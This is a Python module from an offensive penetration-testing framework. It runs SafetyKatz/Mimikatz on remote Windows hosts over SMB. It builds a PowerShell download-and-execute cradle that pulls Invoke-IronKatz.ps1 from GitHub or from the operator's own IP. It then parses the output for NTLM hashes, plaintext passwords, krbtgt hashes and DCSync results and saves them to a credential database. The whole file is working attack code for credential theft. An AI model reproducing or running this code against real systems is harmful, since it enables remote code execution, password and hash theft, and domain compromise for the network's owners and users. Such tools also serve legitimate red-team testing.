import re
from ar3.helpers import powershell
from ar3.helpers.misc import get_local_ip
from ar3.ops.enum.host_enum import code_execution
from ar3.helpers.misc import validate_ntlm

class IronKatz():
    def __init__(self):
        self.name = 'invoke-ironkatz'
        self.description = 'Execute SafetyKatz using an embedded Iron Python Engine'
        self.author = ['@m8r0wn']
        self.credit = ['@byt3bl33d3r', '@harmj0y']
        self.args = {}

    def run(self, target, args, smb_con, loggers, config_obj):
        logger = loggers['console']
        try:
            # Get script:
            if args.fileless:
                srv_addr = get_local_ip()
                script_location = 'http://{}/Invoke-Ironkatz.ps1'.format(srv_addr)
            else:
                script_location = 'https://raw.githubusercontent.com/m8r0wn/OffensiveDLR/master/Invoke-IronKatz.ps1'
            logger.debug('Fetching script from {}'.format(script_location))

            # Setup
            timeout = args.timeout
            setattr(args, 'timeout', timeout+10)       # Modify timeout to allow execution time
            launcher = powershell.gen_ps_iex_cradle(script_location, '')

            try:
                # Execute
                cmd = powershell.create_ps_command(launcher, loggers['console'], force_ps32=args.force_ps32, obfs=args.obfs, server_os=smb_con.os)
                loggers['console'].info([smb_con.host, smb_con.ip, self.name.upper(), 'Attempting Invoke-IronKatz'])
                x = code_execution(smb_con, args, target, loggers, config_obj, cmd=cmd, return_data=True)
                # Display Output
                for line in x.splitlines():
                    loggers['console'].success([smb_con.host, smb_con.ip, self.name.upper(), line])

                # Parse results and send creds to db
                db_updates = 0
                for cred in self.parse_mimikatz(x):
                    if cred[0] == "hash":
                        smb_con.db.update_user(cred[2], '', cred[1], cred[3])
                        db_updates += 1

                    elif cred[0] == "plaintext":
                        smb_con.db.update_user(cred[2], cred[3], cred[1], '')
                        db_updates += 1
                loggers['console'].success([smb_con.host, smb_con.ip, self.name.upper(), "{} credentials updated in database".format(db_updates)])
            except Exception as e:
                loggers['console'].debug([smb_con.host, smb_con.ip, self.name.upper(), str(e)])

        except Exception as e:
            logger.debug("{} Error: {}".format(self.name, str(e)))

    def uniquify_tuples(self, tuples):
        """
        uniquify mimikatz tuples based on the password
        cred format- (credType, domain, username, password, hostname, sid)
        Stolen from the Empire project.
        """
        seen = set()
        return [item for item in tuples if
                "{}{}{}{}".format(item[0], item[1], item[2], item[3]) not in seen and not seen.add(
                    "{}{}{}{}".format(item[0], item[1], item[2], item[3]))]

    def parse_mimikatz(self, data):
        """
        Parse the output from Invoke-Mimikatz to return credential sets.
        This was directly stolen from the Empire project as well.
        """
        # cred format:
        #   credType, domain, username, password, hostname, sid
        creds = []

        # regexes for "sekurlsa::logonpasswords" Mimikatz output
        regexes = ["(?s)(?<=msv :).*?(?=tspkg :)", "(?s)(?<=tspkg :).*?(?=wdigest :)",
                   "(?s)(?<=wdigest :).*?(?=kerberos :)", "(?s)(?<=kerberos :).*?(?=ssp :)",
                   "(?s)(?<=ssp :).*?(?=credman :)", "(?s)(?<=credman :).*?(?=Authentication Id :)",
                   "(?s)(?<=credman :).*?(?=mimikatz)"]

        hostDomain = ""
        domainSid = ""
        hostName = ""

        lines = data.split("\n")
        for line in lines[0:2]:
            if line.startswith("Hostname:"):
                try:
                    domain = line.split(":")[1].strip()
                    temp = domain.split("/")[0].strip()
                    domainSid = domain.split("/")[1].strip()

                    hostName = temp.split(".")[0]
                    hostDomain = ".".join(temp.split(".")[1:])
                except:
                    pass

        for regex in regexes:
            p = re.compile(regex)
            for match in p.findall(data):
                lines2 = match.split("\n")
                username, domain, password = "", "", ""
                for line in lines2:
                    try:
                        if "Username" in line:
                            username = line.split(":", 1)[1].strip()
                        elif "Domain" in line:
                            domain = line.split(":", 1)[1].strip()
                        elif "NTLM" in line or "Password" in line:
                            password = line.split(":", 1)[1].strip()
                    except:
                        pass
                if username != "" and password != "" and password != "(null)":
                    sid = ""
                    # substitute the FQDN in if it matches
                    if hostDomain.startswith(domain.lower()):
                        domain = hostDomain
                        sid = domainSid
                    if validate_ntlm(password):
                        credType = "hash"
                    else:
                        credType = "plaintext"
                    # ignore machine account plaintexts
                    if not (credType == "plaintext" and username.endswith("$")):
                        creds.append((credType, domain, username, password, hostName, sid))

        if len(creds) == 0:
            # check if we have lsadump output to check for krbtgt
            #   happens on domain controller hashdumps
            for x in range(8, 13):
                if lines[x].startswith("Domain :"):
                    domain, sid, krbtgtHash = "", "", ""
                    try:
                        domainParts = lines[x].split(":")[1]
                        domain = domainParts.split("/")[0].strip()
                        sid = domainParts.split("/")[1].strip()
                        # substitute the FQDN in if it matches
                        if hostDomain.startswith(domain.lower()):
                            domain = hostDomain
                            sid = domainSid
                        for x in range(0, len(lines)):
                            if lines[x].startswith("User : krbtgt"):
                                krbtgtHash = lines[x + 2].split(":")[1].strip()
                                break
                        if krbtgtHash != "":
                            creds.append(("hash", domain, "krbtgt", krbtgtHash, hostName, sid))
                    except Exception as e:
                        pass

        if len(creds) == 0:
            # check if we get lsadump::dcsync output
            if '** SAM ACCOUNT **' in lines:
                domain, user, userHash, dcName, sid = "", "", "", "", ""
                for line in lines:
                    try:
                        if line.strip().endswith("will be the domain"):
                            domain = line.split("'")[1]
                        elif line.strip().endswith("will be the DC server"):
                            dcName = line.split("'")[1].split(".")[0]
                        elif line.strip().startswith("SAM Username"):
                            user = line.split(":")[1].strip()
                        elif line.strip().startswith("Object Security ID"):
                            parts = line.split(":")[1].strip().split("-")
                            sid = "-".join(parts[0:-1])
                        elif line.strip().startswith("Hash NTLM:"):
                            userHash = line.split(":")[1].strip()
                    except:
                        pass
                if domain != "" and userHash != "":
                    creds.append(("hash", domain, user, userHash, dcName, sid))
        return self.uniquify_tuples(creds)